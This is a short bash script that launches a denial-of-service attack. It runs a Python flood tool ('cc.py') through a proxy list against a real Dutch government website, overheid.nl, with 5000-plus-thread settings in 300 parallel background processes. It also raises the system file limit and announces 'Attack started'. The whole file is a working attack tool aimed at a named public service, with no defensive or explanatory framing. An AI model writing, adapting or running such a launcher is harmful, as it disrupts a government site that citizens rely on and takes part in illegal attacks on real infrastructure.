#!/bin/bash
#
#  Please prepared proxies list at first.
#  And then change the command in atk_cmd
#  And change the process number
#  Lastly run this script
#
#the command you want to exec
atk_cmd="python cc.py -url https://www.overheid.nl/ -f proxy.txt -v 5 -s 300 -t 2000"

#number of process that you want
process=300

#change the system limit
ulimit -n 9999999

echo Attack started
for ((i=1;i<=$process;i++))
do
  $atk_cmd >/dev/null &
  sleep 0.1
done
